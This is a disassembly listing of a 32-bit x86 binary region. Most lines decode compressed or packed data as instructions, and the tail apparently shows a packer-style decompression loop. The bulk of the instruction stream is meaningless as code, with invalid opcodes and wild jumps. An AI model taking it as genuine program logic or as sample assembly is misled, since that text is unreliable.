  4972da:	jmp    0x497324
  4972dc:	jns    0x497318
  4972de:	adc    bh,BYTE PTR [edx+0x15]
  4972e1:	int3   
  4972e2:	nop    DWORD PTR [edi]
  4972e5:	dec    esi
  4972e6:	fs mov ebx,0x25032de7
  4972ec:	cmp    eax,0x940a2270
  4972f1:	cmp    DWORD PTR [ebx+0x1d1d3083],edi
  4972f7:	push   ds
  4972f8:	ins    DWORD PTR es:[edi],dx
  4972f9:	add    BYTE PTR [edx+0x145b6d57],al
  4972ff:	imul   ebp,DWORD PTR [ecx-0x73],0x46
  497303:	not    BYTE PTR [edx]
  497305:	mov    ebp,0x73756cf3
  49730a:	push   0xc95d6b19
  49730f:	and    al,BYTE PTR [eax+ebx*8]
  497312:	rcl    DWORD PTR [edi+0x166129eb],cl
  497318:	push   esi
  497319:	mov    cl,0xc8
  49731b:	imul   edx,DWORD PTR [esi],0xffffff95
  49731e:	push   cs
  49731f:	arpl   WORD PTR [ebx],bp
  497321:	inc    ecx
  497322:	dec    ecx
  497323:	dec    edx
  497324:	aaa    
  497325:	(bad)  
  497326:	jmp    0x505edf03
  49732b:	push   0xffffffc4
  49732d:	je     0x497376
  49732f:	aaa    
  497330:	jae    0x497344
  497332:	add    BYTE PTR [edi+eiz*4+0x65d822f6],dl
  497339:	pop    eax
  49733a:	adc    DWORD PTR [ecx+0x7d],0x78
  49733e:	and    BYTE PTR [ebx],al
  497340:	cmp    esp,ecx
  497342:	inc    esi
  497343:	mov    dh,0x2d
  497345:	inc    edi
  497346:	adc    eax,DWORD PTR [edx]
  497348:	jnp    0x497392
  49734a:	mul    DWORD PTR [ecx]
  49734c:	pusha  
  49734d:	lods   eax,DWORD PTR ds:[esi]
  49734e:	or     DWORD PTR [ebx-0x4f],ebp
  497351:	outs   dx,DWORD PTR ds:[esi]
  497352:	pop    eax
  497353:	adc    dl,BYTE PTR [esi+0x2f21ec0b]
  497359:	sub    DWORD PTR [eax-0x5bc173f8],esi
  49735f:	dec    esi
  497360:	outs   dx,DWORD PTR ds:[esi]
  497361:	mov    ch,0x1
  497363:	or     BYTE PTR [ebp+0x6f3d301b],0x6d
  49736a:	xor    eax,0x76aec75a
  49736f:	daa    
  497370:	test   al,0x29
  497372:	adc    eax,0xa74abb02
  497377:	sub    edx,ecx
  497379:	sub    ah,BYTE PTR [ecx+eax*4+0x42252f39]
  497380:	cmp    al,0x6e
  497382:	xor    BYTE PTR [ebp-0x75d62f7e],dh
  497388:	ins    DWORD PTR es:[edi],dx
  497389:	(bad)  
  49738a:	ja     0x49737c
  49738c:	and    cl,BYTE PTR [eax]
  49738e:	int    0xfe
  497390:	and    edx,ebx
  497392:	inc    edx
  497393:	imul   edx,ebp,0x16
  497396:	add    DWORD PTR [ecx],0x872b9b55
  49739c:	test   BYTE PTR [esi],ah
  49739e:	cmp    DWORD PTR [ebx+0x29d8b7a3],0x779c2d30
  4973a8:	sbb    DWORD PTR [eax],edx
  4973aa:	pop    ebx
  4973ab:	retf   
  4973ac:	test   BYTE PTR [edi-0x5a7ece2b],bl
  4973b2:	xor    BYTE PTR [ebx+eiz*4+0x473f4e25],ch
  4973b9:	pop    ds
  4973ba:	jnp    0x49736a
  4973bc:	das    
  4973bd:	push   esp
  4973be:	add    DWORD PTR ds:0xc236047,0x70
  4973c5:	and    ah,BYTE PTR [ebx+0x7b82aff7]
  4973cb:	push   ebx
  4973cc:	sub    al,0x9e
  4973ce:	arpl   WORD PTR [eax+0x42],bp
  4973d1:	ins    BYTE PTR es:[edi],dx
  4973d2:	pop    ss
  4973d3:	in     eax,0x4f
  4973d5:	jb     0x4973ad
  4973d7:	inc    ebx
  4973d8:	jp     0x4973e7
  4973da:	jp     0x497454
  4973dc:	pop    ds
  4973dd:	add    BYTE PTR [eax-0x53b7e4b8],bl
  4973e3:	and    esp,DWORD PTR [ebx]
  4973e5:	shr    BYTE PTR [esi-0x3f],cl
  4973e8:	(bad)  
  4973e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4973ea:	sbb    bh,BYTE PTR [ebp-0x67]
  4973ed:	addr16 or eax,0x4f520fbd
  4973f3:	push   eax
  4973f4:	xor    dl,BYTE PTR [ecx]
  4973f6:	lods   eax,DWORD PTR ds:[esi]
  4973f7:	adc    ecx,DWORD PTR [edx-0x68]
  4973fa:	xor    bh,0x44
  4973fd:	dec    ecx
  4973fe:	inc    edx
  4973ff:	gs sub al,0x33
  497402:	ss imul ecx,edx,0x40
  497406:	pop    ebx
  497407:	test   eax,0x1ed86b00
  49740c:	dec    ebx
  49740d:	jge    0x497470
  49740f:	push   es
  497410:	pop    edi
  497411:	aas    
  497412:	or     DWORD PTR [ebp-0x7b8b9fb0],edi
  497418:	xchg   ecx,eax
  497419:	mov    ah,0x2d
  49741b:	fcomp  DWORD PTR ds:0x61c61b6d
  497421:	mov    DWORD PTR [edi],edx
  497423:	not    DWORD PTR [edx+0x67]
  497426:	outs   dx,BYTE PTR ds:[esi]
  497427:	sbb    al,0xfe
  497429:	inc    esp
  49742a:	inc    ebx
  49742b:	jnp    0x49749f
  49742d:	inc    edx
  49742e:	mov    dh,0x9
  497430:	push   eax
  497431:	adc    eax,0x30a8293e
  497436:	jbe    0x497418
  497438:	sbb    ecx,ebp
  49743a:	cdq    
  49743b:	mov    ah,0x30
  49743d:	xor    BYTE PTR [ecx+0x1c],bh
  497440:	jecxz  0x4973db
  497442:	or     DWORD PTR cs:[eax],eax
  497445:	outs   dx,DWORD PTR ds:[esi]
  497446:	inc    ecx
  497447:	inc    edx
  497448:	adc    BYTE PTR ds:0xdc066c2f,ah
  49744e:	sbb    BYTE PTR [ebx+esi*8],ah
  497451:	jae    0x49741c
  497453:	jmp    0x86773523
  497458:	inc    edi
  497459:	aas    
  49745a:	push   ds
  49745b:	add    ebx,DWORD PTR [ecx]
  49745d:	nop
  49745e:	push   cs
  49745f:	dec    ebx
  497460:	jne    0x497459
  497462:	inc    esp
  497463:	cmp    BYTE PTR [edx*4+0x413233f1],ch
  49746a:	ins    BYTE PTR es:[edi],dx
  49746b:	mov    ah,0xa5
  49746d:	adc    ch,dh
  49746f:	push   DWORD PTR [edx]
  497471:	pusha  
  497472:	add    BYTE PTR [edx+esi*2],0xad
  497476:	add    bh,cl
  497478:	push   0x6f
  49747a:	ret    
  49747b:	push   esp
  49747c:	mov    bh,0x47
  49747e:	imul   edx,DWORD PTR [ebx],0xb9a5059
  497484:	(bad)  [edi-0x7]
  497487:	and    DWORD PTR gs:[ebx],esi
  49748a:	add    DWORD PTR [ebx-0x7c],ecx
  49748d:	in     al,0x35
  49748f:	cs xor al,0x3c
  497492:	aad    0xc4
  497494:	sbb    BYTE PTR ds:0xd6b023db,dl
  49749a:	add    DWORD PTR [ebx-0x480e9cbd],0xc1d8b6c1
  4974a4:	sub    ecx,ecx
  4974a6:	inc    edx
  4974a7:	outs   dx,DWORD PTR ds:[esi]
  4974a8:	pop    ss
  4974a9:	add    al,0x80
  4974ab:	mov    bh,0x8a
  4974ad:	aaa    
  4974ae:	sbb    eax,0x57642c10
  4974b3:	mov    ebx,0xa0d201bb
  4974b8:	jo     0x497535
  4974ba:	push   eax
  4974bb:	and    eax,0xb6d82e5f
  4974c0:	and    BYTE PTR [edi+0x1b],bh
  4974c3:	fiadd  DWORD PTR ds:0xc212233d
  4974c9:	cmp    eax,0xc1a2799d
  4974ce:	xchg   BYTE PTR [ebx],ah
  4974d0:	push   eax
  4974d1:	hlt    
  4974d2:	mov    al,0x64
  4974d4:	mov    eax,ds:0x8c56dcd1
  4974d9:	and    eax,0x66481d29
  4974de:	sub    esp,DWORD PTR [eax]
  4974e0:	xor    al,0x85
  4974e2:	ret    0x882d
  4974e5:	sbb    al,0x84
  4974e7:	or     esp,DWORD PTR [ecx+0x73]
  4974ea:	(bad)
  4974ed:	test   BYTE PTR [eax+0x1b],bl
  4974f0:	cmp    BYTE PTR [edi],bl
  4974f2:	aas    
  4974f3:	aam    0x6
  4974f5:	(bad)  
  4974f6:	pop    esi
  4974f7:	stc    
  4974f8:	je     0x497502
  4974fa:	sub    ah,BYTE PTR [edi]
  4974fc:	mov    eax,ds:0x7bb120e0
  497501:	push   ecx
  497502:	cmp    eax,DWORD PTR [esi]
  497504:	in     al,dx
  497505:	jno    0x497568
  497507:	inc    ebp
  497508:	push   cs
  497509:	cmp    eax,0x85683900
  49750e:	daa    
  49750f:	and    eax,0xdc4cb49d
  497514:	mov    cl,BYTE PTR [esi]
  497516:	add    BYTE PTR [edi+0x664f3e50],ch
  49751c:	ins    BYTE PTR es:[edi],dx
  49751d:	and    eax,0xf053587d
  497522:	sub    DWORD PTR [esi+0x55],ebp
  497525:	inc    edx
  497526:	stos   BYTE PTR es:[edi],al
  497527:	nop
  497528:	dec    esp
  497529:	ins    BYTE PTR es:[edi],dx
  49752a:	mov    ah,BYTE PTR [edi]
  49752c:	dec    esp
  49752d:	inc    ecx
  49752e:	inc    edx
  49752f:	xor    eax,DWORD PTR [ecx+eiz*8+0x1]
  497533:	mov    bl,0x53
  497535:	push   edx
  497536:	fcmovbe st,st(3)
  497538:	and    eax,0x1979706f
  49753d:	or     DWORD PTR [esi+0x1bc83b18],eax
  497543:	and    edx,DWORD PTR ds:[ecx]
  497546:	daa    
  497547:	cmp    al,0xce
  497549:	fadd   QWORD PTR [ecx-0x699e7b3a]
  49754f:	sbb    ebp,edi
  497551:	rcr    DWORD PTR ds:0xf94c2365,1
  497557:	mov    ah,0xc4
  497559:	sahf   
  49755a:	hlt    
  49755b:	sub    DWORD PTR ds:0x8738467e,esp
  497561:	or     BYTE PTR [edi+eax*2],dl
  497564:	dec    ecx
  497565:	(bad)  
  497566:	ret    0xe1f8
  497569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49756a:	adc    DWORD PTR [edx+0xe],esp
  49756d:	xchg   edx,eax
  49756e:	push   edx
  49756f:	xor    al,0x84
  497571:	add    eax,0x85121199
  497576:	adc    ebx,esi
  497578:	or     edx,DWORD PTR ds:0x34d18e9
  49757e:	xor    eax,DWORD PTR [ecx]
  497580:	dec    esi
  497581:	pop    esp
  497582:	push   0xbf415b4e
  497587:	in     eax,0x29
  497589:	xlat   BYTE PTR ds:[ebx]
  49758a:	nop
  49758b:	pop    ebx
  49758c:	jo     0x4975e3
  49758e:	jo     0x4975f4
  497590:	cmc    
  497591:	je     0x497529
  497593:	push   cs
  497594:	sub    al,0x3d
  497596:	adc    eax,DWORD PTR [ecx+0x73]
  497599:	inc    ebx
  49759a:	add    al,0x2b
  49759c:	popa   
  49759d:	pusha  
  49759e:	retf   
  49759f:	dec    eax
  4975a0:	xchg   BYTE PTR [eax-0x1ceb8e1b],dl
  4975a6:	xchg   ebp,eax
  4975a7:	mov    al,ds:0x6cbb1b48
  4975ac:	outs   dx,BYTE PTR ds:[esi]
  4975ad:	lea    esp,[ebx]
  4975af:	mov    esi,0x603200de
  4975b4:	jg     0x49756e
  4975b6:	sub    esp,DWORD PTR [ebx+0x14]
  4975b9:	or     al,0x98
  4975bb:	jo     0x4975c0
  4975bd:	lods   al,BYTE PTR ds:[esi]
  4975be:	pop    esp
  4975bf:	sbb    BYTE PTR [esi-0x258d3cff],ah
  4975c5:	jae    0x4975e8
  4975c7:	js     0x4975e9
  4975c9:	pop    ss
  4975ca:	retf   
  4975cb:	int3   
  4975cc:	add    esi,DWORD PTR [edi]
  4975ce:	cmp    BYTE PTR [ecx+0x3],al
  4975d1:	out    0x1d,eax
  4975d3:	in     al,dx
  4975d4:	sti    
  4975d5:	adc    al,0xa5
  4975d7:	es mov esi,DWORD PTR fs:[ebx+0x21]
  4975dc:	inc    ecx
  4975dd:	sbb    dh,al
  4975df:	xor    ebx,0x66053117
  4975e5:	mov    ch,0x76
  4975e7:	inc    ecx
  4975e8:	and    eax,0x5891fc7
  4975ed:	add    bh,BYTE PTR [ebx]
  4975ef:	xchg   esi,eax
  4975f0:	sbb    edi,DWORD PTR [eax+0x6d7e446f]
  4975f6:	dec    esi
  4975f7:	arpl   WORD PTR [edi+ebp*2+0x6e],cx
  4975fb:	addr16 (bad) 
  4975fe:	or     DWORD PTR [edx],ebx
  497600:	js     0x4975bf
  497602:	in     eax,dx
  497603:	shl    BYTE PTR [eax-0x25],0xd6
  497607:	pop    ds
  497608:	xchg   edi,eax
  497609:	sbb    ecx,DWORD PTR [ecx+0x3c02c43b]
  49760f:	test   eax,0x9370f0eb
  497614:	inc    ecx
  497615:	push   esi
  497616:	fsub   DWORD PTR [eax]
  497618:	aam    0xc9
  49761a:	stc    
  49761b:	ins    DWORD PTR es:[edi],dx
  49761c:	or     esi,DWORD PTR [esi]
  49761e:	mov    esp,edi
  497620:	and    ecx,DWORD PTR [ebx+0x46]
  497623:	outs   dx,DWORD PTR ds:[esi]
  497624:	mov    dl,0xd
  497626:	lahf   
  497627:	xchg   edx,eax
  497628:	lahf   
  497629:	or     ebp,DWORD PTR [ecx]
  49762b:	cs push esi
  49762d:	nop
  49762e:	sub    esi,eax
  497630:	int    0xdd
  497632:	sub    eax,eax
  497634:	(bad)  
  497635:	inc    eax
  497636:	or     dl,BYTE PTR [ecx-0x68]
  497639:	cmp    BYTE PTR [eax-0x26],bl
  49763c:	add    DWORD PTR [ebp+0xe810b35],edx
  497642:	sbb    eax,0xad6e304b
  497647:	push   ecx
  497648:	aaa    
  497649:	arpl   WORD PTR [ebx+0x21a5397],ax
  49764f:	test   BYTE PTR [edx+0x39],al
  497652:	and    BYTE PTR [ebx-0x10],bl
  497655:	test   BYTE PTR [edi+0x4bea1969],dl
  49765b:	add    al,0x90
  49765d:	xor    eax,0xb1c76c57
  497662:	in     eax,dx
  497663:	sub    edx,DWORD PTR ds:0xa74d52e1
  497669:	sub    BYTE PTR [edi+0x2fd3b4b0],ch
  49766f:	sti    
  497670:	xor    DWORD PTR [edx+esi*4],ecx
  497673:	xchg   bl,bl
  497675:	not    DWORD PTR [edx-0x5d]
  497678:	jo     0x49762e
  49767a:	lds    esi,FWORD PTR [ecx-0x12f39be2]
  497680:	call   0x50f0830c
  497685:	push   eax
  497686:	jg     0x497640
  497688:	je     0x4976db
  49768a:	jne    0x497655
  49768c:	ins    DWORD PTR es:[edi],dx
  49768d:	int3   
  49768e:	lods   eax,DWORD PTR ds:[esi]
  49768f:	inc    ebx
  497690:	and    ecx,eax
  497692:	sbb    ah,BYTE PTR [ebp+0x65]
  497695:	imul   eax,DWORD PTR [ebx+eax*8],0xffffffb0
  497699:	sub    ch,BYTE PTR [eax+0x4ff17366]
  49769f:	jb     0x497661
  4976a1:	jbe    0x497709
  4976a3:	or     al,0xa6
  4976a5:	xchg   BYTE PTR [esi],ch
  4976a7:	inc    ebx
  4976a8:	ds add ah,BYTE PTR gs:[edi+0x5a]
  4976ad:	sbb    DWORD PTR [eax-0x33],ebp
  4976b0:	adc    esi,DWORD PTR [ebx-0x7a]
  4976b3:	adc    ch,BYTE PTR [ecx+0x463b21f1]
  4976b9:	sbb    ebx,0x32
  4976bc:	gs mov ebx,0x792c19d9
  4976c2:	popa   
  4976c3:	cmp    edx,DWORD PTR [eax-0x28d6ac58]
  4976c9:	xchg   esi,eax
  4976ca:	bound  edi,QWORD PTR [ebx+0x16]
  4976cd:	adc    eax,0xf4fb1923
  4976d2:	sbb    eax,0x4b182f86
  4976d7:	imul   eax,esi,0x5a734975
  4976dd:	mov    edx,DWORD PTR [eax+0x12224d29]
  4976e3:	fs test ebp,0x63590c76
  4976ea:	and    DWORD PTR [ebx+0x3050243],edi
  4976f0:	mov    bh,0x13
  4976f2:	xchg   ebx,eax
  4976f3:	push   eax
  4976f4:	outs   dx,BYTE PTR ds:[esi]
  4976f5:	ja     0x4976fe
  4976f7:	jno    0x497711
  4976f9:	loope  0x497764
  4976fb:	arpl   WORD PTR [ebx],dx
  4976fd:	retf   0x14b2
  497700:	cmp    al,0x97
  497702:	in     eax,dx
  497703:	and    ah,BYTE PTR [edx+eax*2+0x38]
  497707:	pand   mm2,QWORD PTR [eax]
  49770a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49770b:	or     esi,ebp
  49770d:	je     0x497734
  49770f:	out    dx,al
  497710:	jae    0x497733
  497712:	pusha  
  497713:	(bad)  
  497714:	popa   
  497715:	xchg   BYTE PTR ds:0x2141f373,bl
  49771b:	mov    DWORD PTR [ecx],ecx
  49771d:	push   esi
  49771e:	pop    edi
  49771f:	sbb    DWORD PTR [esi+0x63],esp
  497722:	outs   dx,DWORD PTR ds:[esi]
  497723:	imul   esi,DWORD PTR [eax],0x17af1be9
  497729:	aad    0xb4
  49772b:	lods   eax,DWORD PTR ds:[esi]
  49772c:	lods   eax,DWORD PTR ds:[esi]
  49772d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49772e:	pop    ds
  49772f:	jno    0x4976d8
  497731:	lock sbb BYTE PTR [ebx-0x38],bl
  497735:	inc    edi
  497736:	pop    ds
  497737:	xchg   ebp,eax
  497738:	rol    BYTE PTR [ebp+edx*1+0x236f0057],cl
  49773f:	out    dx,eax
  497740:	out    dx,eax
  497741:	push   0x2343152d
  497746:	or     DWORD PTR ds:0x32dbad8,ebx
  49774c:	jge    0x497771
  49774e:	pop    ss
  49774f:	aad    0x76
  497751:	sbb    DWORD PTR ss:[ebp+0x62],esi
  497755:	push   ebp
  497756:	popa   
  497757:	inc    edi
  497758:	push   esp
  497759:	adc    esi,DWORD PTR [edx+0x20]
  49775c:	inc    edi
  49775d:	inc    edi
  49775e:	dec    edi
  49775f:	mov    al,0x82
  497761:	dec    ebx
  497762:	jb     0x4977ab
  497764:	adc    al,0x31
  497766:	sbb    eax,0xe1da5c2e
  49776b:	std    
  49776c:	retf   
  49776d:	dec    edi
  49776e:	push   ebp
  49776f:	ins    DWORD PTR es:[edi],dx
  497770:	xchg   DWORD PTR [ebp-0x3ee47be1],esi
  497776:	inc    esi
  497777:	or     eax,0x4423b136
  49777c:	sbb    eax,0x50b558fb
  497781:	fldenv [ebx]
  497783:	mov    cl,0x81
  497785:	imul   esp,DWORD PTR [ecx],0x27cf077a
  49778b:	or     ebx,eax
  49778d:	aad    0x9e
  49778f:	dec    eax
  497790:	inc    esp
  497791:	sub    eax,0x68582d78
  497796:	mov    al,0xb0
  497798:	and    eax,0xc6bbc6d
  49779d:	push   ds
  49779e:	test   eax,0xca09b17d
  4977a3:	jp     0x497738
  4977a5:	test   eax,0x51347f9
  4977aa:	lds    ebx,FWORD PTR [edx+0x2a]
  4977ad:	adc    esi,DWORD PTR [edi]
  4977af:	xchg   BYTE PTR [ebx],bl
  4977b1:	xor    ch,BYTE PTR [ebp+0x1999e9c8]
  4977b7:	(bad)
  4977ba:	xchg   ebp,eax
  4977bb:	ins    DWORD PTR es:[edi],dx
  4977bc:	sbb    edx,DWORD PTR ds:0x6d864bbf
  4977c2:	xchg   DWORD PTR [esi+0x571dcff1],ebp
  4977c8:	xchg   ah,ah
  4977ca:	or     BYTE PTR [eax-0x4db9b86b],dl
  4977d0:	xchg   DWORD PTR [edx-0x3f74a5f9],esi
  4977d6:	sub    eax,0x9e77a1e0
  4977db:	fadd   QWORD PTR [esi+0x2d]
  4977de:	fcomp  st(2)
  4977e0:	push   esi
  4977e1:	iret   
  4977e2:	jbe    0x4977f5
  4977e4:	adc    al,0x1c
  4977e6:	jno    0x49779a
  4977e8:	xor    edx,DWORD PTR [esi-0x7f7324d8]
  4977ee:	xor    ebx,DWORD PTR [ecx]
  4977f0:	mov    ebx,0x509ca925
  4977f5:	mov    ah,0xd2
  4977f7:	popa   
  4977f8:	cmp    eax,0xb08a591d
  4977fd:	ins    DWORD PTR es:[edi],dx
  4977fe:	out    0x1b,eax
  497800:	mov    ebp,db1
  497803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  497804:	and    BYTE PTR [ebx+eax*4],dl
  497807:	sub    BYTE PTR [edi+ebx*1+0x70],al
  49780b:	jo     0x4977dc
  49780d:	mov    ebp,0x194f3115
  497812:	mov    ebp,0x363641d4
  497817:	push   cs
  497818:	pop    ss
  497819:	adc    ecx,DWORD PTR [ebp-0x734c5cfb]
  49781f:	frstor [ebx]
  497821:	inc    ebp
  497822:	fs dec ecx
  497824:	xchg   ecx,eax
  497825:	stos   BYTE PTR es:[edi],al
  497826:	pop    ebp
  497827:	add    bl,BYTE PTR [edi]
  497829:	mov    ebx,0xb9042db9
  49782e:	inc    edi
  49782f:	pop    ss
  497830:	sbb    eax,0xb64362c5
  497835:	lea    ebx,[ecx]
  497837:	lods   eax,DWORD PTR ds:[esi]
  497838:	sbb    ebp,esp
  49783a:	das    
  49783b:	gs ret 
  49783d:	push   edx
  49783e:	mov    bl,0x4f
  497840:	data16 jg 0x49784c
  497843:	ins    DWORD PTR es:[edi],dx
  497844:	xor    DWORD PTR [ebp+0x3d],esp
  497847:	pop    ds
  497848:	inc    edi
  497849:	and    esi,eax
  49784b:	test   ebp,ebp
  49784d:	and    BYTE PTR ds:0x6059811d,ah
  497853:	pop    ecx
  497854:	stos   BYTE PTR es:[edi],al
  497855:	push   edi
  497856:	and    DWORD PTR [edi],edx
  497858:	jmp    0x179f8039
  49785d:	stos   DWORD PTR es:[edi],eax
  49785e:	or     BYTE PTR [ebx+0x34b0d21e],0x0
  497865:	jmp    0xcb2:0x8bdad931
  49786c:	repz and DWORD PTR [esp+esi*4],ebp
  497870:	or     eax,DWORD PTR [edi-0x6288adb2]
  497876:	fld    QWORD PTR fs:[edx]
  497879:	sbb    ebp,ecx
  49787b:	pop    edx
  49787c:	aaa    
  49787d:	inc    ecx
  49787e:	adc    eax,0x902736c
  497883:	icebp  
  497884:	pop    ss
  497885:	shr    bl,0xda
  497888:	and    al,0x5
  49788a:	sahf   
  49788b:	das    
  49788c:	loope  0x49785f
  49788e:	outs   dx,BYTE PTR ds:[esi]
  49788f:	enter  0x8572,0xd7
  497893:	icebp  
  497894:	cmp    ah,BYTE PTR [edx-0x47e4e9dd]
  49789a:	retf   0xc0a2
  49789d:	adc    ch,BYTE PTR [ebx+0x29]
  4978a0:	dec    esi
  4978a1:	ret    
  4978a2:	jp     0x4978a9
  4978a4:	jmp    0x4978e6
  4978a6:	cmp    DWORD PTR ds:0x9c975d00,eax
  4978ac:	cmp    dl,BYTE PTR ds:0x23064400
  4978b2:	push   ebx
  4978b3:	inc    ebx
  4978b4:	and    eax,0x17a3d1a
  4978b9:	cmp    ebp,ecx
  4978bb:	jmp    0x3213ebf5
  4978c0:	call   FWORD PTR [edi+0x50]
  4978c3:	(bad)  
  4978c4:	inc    ecx
  4978c5:	mov    eax,ds:0x4550
  4978ca:	dec    esp
  4978cb:	add    DWORD PTR [eax],ecx
  4978cd:	add    BYTE PTR [ecx],bl
  4978cf:	pop    esi
  4978d0:	mov    ds:0x42c83ff0,eax
  4978d5:	sub    al,BYTE PTR [eax]
  4978d7:	pop    DWORD PTR [ecx+0x1902010b]
  4978dd:	add    BYTE PTR [esi-0x20],cl
  4978e0:	lock push 0x3946cdc
  4978e6:	dec    edi
  4978e7:	pop    ebp
  4978e8:	push   ss
  4978e9:	int3   
  4978ea:	pusha  
  4978eb:	or     eax,DWORD PTR [ebp+0x4008a5d9]
  4978f1:	pop    ss
  4978f2:	add    al,cl
  4978f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4978f5:	lock imul DWORD PTR [ebp+0xf]
  4978f9:	push   ecx
  4978fa:	or     DWORD PTR [ecx],ebx
  4978fc:	adc    eax,0x6bd509e1
  497901:	iret   
  497902:	ins    DWORD PTR es:[edi],dx
  497903:	lahf   
  497904:	push   ecx
  497905:	inc    eax
  497906:	packuswb mm2,QWORD PTR [ebx]
  497909:	add    DWORD PTR ds:0x90b6e4a6,ecx
  49790f:	sahf   
  497910:	xor    BYTE PTR [ecx],ah
  497912:	outs   dx,DWORD PTR ds:[esi]
  497913:	scas   al,BYTE PTR es:[edi]
  497914:	stc    
  497915:	adc    al,0x36
  497917:	xlat   BYTE PTR ds:[ebx]
  497918:	mov    dh,0x2
  49791a:	xor    edi,DWORD PTR [edi]
  49791c:	loopne 0x497916
  49791e:	pusha  
  49791f:	push   ebx
  497920:	and    DWORD PTR [edi+0x5d08b62],ebx
  497926:	add    BYTE PTR [eax],bl
  497928:	inc    ebx
  497929:	popa   
  49792a:	xor    cl,bl
  49792c:	loopne 0x49797d
  49792e:	inc    esp
  49792f:	inc    ebp
  497930:	scas   eax,DWORD PTR es:[edi]
  497931:	cwde   
  497932:	dec    ebp
  497933:	(bad)  
  497934:	xchg   DWORD PTR [edi],ecx
  497936:	cs dec edx
  497938:	pop    ebx
  497939:	and    dl,bl
  49793b:	inc    esp
  49793c:	inc    ecx
  49793d:	push   esp
  49793e:	push   ebx
  49793f:	xchg   edx,eax
  497940:	into   
  497941:	mov    ebx,0xf713a8e0
  497946:	adc    al,0xe
  497948:	push   edx
  497949:	mov    bh,0xf2
  49794b:	add    DWORD PTR [eax+0x69],0xffffffc0
  49794f:	inc    edx
  497950:	push   ebx
  497951:	push   ebx
  497952:	std    
  497953:	or     edi,DWORD PTR [esi]
  497955:	ret    0xb133
  497958:	xchg   ebx,eax
  497959:	and    BYTE PTR [esi+0x4f],0x0
  49795d:	sub    DWORD PTR cs:[ecx+0x13],edi
  497961:	jl     0x497969
  497963:	popa   
  497964:	add    bh,ah
  497966:	nop
  497967:	dec    esi
  497968:	and    bh,BYTE PTR [ecx+0x4095c31d]
  49796e:	je     0x4979dc
  497970:	jae    0x4979c9
  497972:	rcr    BYTE PTR [edi+0x2e46e988],0x44
  497979:	jb     0x497993
  49797b:	dec    edi
  49797c:	shr    BYTE PTR [ebx+0x2e4a669],1
  497982:	inc    eax
  497983:	push   eax
  497984:	gs enter 0x66f3,0x78
  497989:	jo     0x497922
  49798b:	loopne 0x4979db
  49798d:	bound  ecx,QWORD PTR [edx+0x3b8a45e]
  497993:	jae    0x497a07
  497995:	dec    esp
  497996:	pop    ss
  497997:	es add dl,bh
  49799a:	mov    ebx,0xec7b52d6
  49799f:	dec    edi
  4979a0:	or     BYTE PTR [ecx],cl
  4979a2:	add    al,0x97
  4979a4:	das    
  4979a5:	jge    0x4979fe
  4979a7:	xchg   edx,eax
  4979a8:	and    al,0x49
  4979aa:	ret    0x9
  4979ad:	add    BYTE PTR [eax],al
  4979af:	or     BYTE PTR [edx-0x1],0x0
	...
  4979bf:	add    BYTE PTR [eax-0x42],ah
  4979c2:	add    al,dh
  4979c4:	inc    esi
  4979c5:	add    BYTE PTR [ebp-0x6dfff42],cl
  4979cb:	call   DWORD PTR [edi-0x7d]
  4979ce:	int    0xff
  4979d0:	jmp    0x4979e2
  4979d2:	nop
  4979d3:	nop
  4979d4:	nop
  4979d5:	nop
  4979d6:	nop
  4979d7:	nop
  4979d8:	mov    al,BYTE PTR [esi]
  4979da:	inc    esi
  4979db:	mov    BYTE PTR [edi],al
  4979dd:	inc    edi
  4979de:	add    ebx,ebx
  4979e0:	jne    0x4979e9
  4979e2:	mov    ebx,DWORD PTR [esi]
  4979e4:	sub    esi,0xfffffffc
  4979e7:	adc    ebx,ebx
  4979e9:	jb     0x4979d8
  4979eb:	mov    eax,0x1
  4979f0:	add    ebx,ebx
  4979f2:	jne    0x4979fb
  4979f4:	mov    ebx,DWORD PTR [esi]
  4979f6:	sub    esi,0xfffffffc
  4979f9:	adc    ebx,ebx
  4979fb:	adc    eax,eax
  4979fd:	add    ebx,ebx
  4979ff:	jae    0x497a0c
  497a01:	jne    0x497a2b
  497a03:	mov    ebx,DWORD PTR [esi]
  497a05:	sub    esi,0xfffffffc
  497a08:	adc    ebx,ebx
  497a0a:	jb     0x497a2b
  497a0c:	dec    eax
  497a0d:	add    ebx,ebx
  497a0f:	jne    0x497a18
  497a11:	mov    ebx,DWORD PTR [esi]
  497a13:	sub    esi,0xfffffffc
  497a16:	adc    ebx,ebx
  497a18:	adc    eax,eax
  497a1a:	jmp    0x4979f0
  497a1c:	add    ebx,ebx
  497a1e:	jne    0x497a27
  497a20:	mov    ebx,DWORD PTR [esi]
  497a22:	sub    esi,0xfffffffc
  497a25:	adc    ebx,ebx
  497a27:	adc    ecx,ecx
  497a29:	jmp    0x497a7d
  497a2b:	xor    ecx,ecx
  497a2d:	sub    eax,0x3
  497a30:	jb     0x497a43
  497a32:	shl    eax,0x8
  497a35:	mov    al,BYTE PTR [esi]
  497a37:	inc    esi
  497a38:	xor    eax,0xffffffff
  497a3b:	je     0x497ab2
  497a3d:	sar    eax,1
  497a3f:	mov    ebp,eax
  497a41:	jmp    0x497a4e
  497a43:	add    ebx,ebx
  497a45:	jne    0x497a4e
  497a47:	mov    ebx,DWORD PTR [esi]
  497a49:	sub    esi,0xfffffffc
  497a4c:	adc    ebx,ebx
  497a4e:	jb     0x497a1c
  497a50:	inc    ecx
  497a51:	add    ebx,ebx
  497a53:	jne    0x497a5c
  497a55:	mov    ebx,DWORD PTR [esi]
  497a57:	sub    esi,0xfffffffc
  497a5a:	adc    ebx,ebx
  497a5c:	jb     0x497a1c
  497a5e:	add    ebx,ebx
  497a60:	jne    0x497a69
  497a62:	mov    ebx,DWORD PTR [esi]
  497a64:	sub    esi,0xfffffffc
  497a67:	adc    ebx,ebx
  497a69:	adc    ecx,ecx
  497a6b:	add    ebx,ebx
  497a6d:	jae    0x497a5e
  497a6f:	jne    0x497a7a
  497a71:	mov    ebx,DWORD PTR [esi]
  497a73:	sub    esi,0xfffffffc
  497a76:	adc    ebx,ebx
  497a78:	jae    0x497a5e
  497a7a:	add    ecx,0x2
  497a7d:	cmp    ebp,0xfffffb00
  497a83:	adc    ecx,0x2
  497a86:	lea    edx,[edi+ebp*1]
  497a89:	cmp    ebp,0xfffffffc
  497a8c:	jbe    0x497a9c
